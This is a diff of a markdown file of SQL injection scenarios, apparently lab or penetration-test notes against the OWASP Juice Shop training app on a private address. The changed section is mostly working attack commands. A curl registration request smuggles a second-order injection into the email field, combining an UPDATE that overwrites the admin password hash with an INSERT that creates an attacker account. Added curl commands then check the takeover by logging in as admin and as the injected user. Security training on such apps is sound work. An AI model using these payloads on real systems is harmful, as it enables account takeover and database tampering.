@@ -234,18 +234,32 @@ time_based_sqli(url, true_payload, false_payload)
 3. The malicious SQL may execute when the email is processed internally
 4. Try logging in as admin with password 'hacked'
 
-**Registration Command:**
+**Registration Command (Combined UPDATE and INSERT):**
 
 ```zsh
 curl -X POST "http://10.30.0.237:3000/api/Users/" \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "test'\''INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
+    "email": "test'\'' UPDATE Users SET password='\''c8d15d6f49780e0f7841278759b12cbc'\'' WHERE email='\''admin@juice-sh.op'\''; INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
     "password": "password123",
     "passwordRepeat": "password123",
     "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
     "securityAnswer": "test"
   }'
+```
+
+**Verification:**
+
+```zsh
+# After the second-order injection, try logging in as admin with password 'hacked'
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op","password":"hacked"}'
+
+# Also try logging in as the injected user
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"hacker@test.com","password":"password"}'
 ```
 
 ### SQL Injection Scenario 7: Error-Based SQL Injection
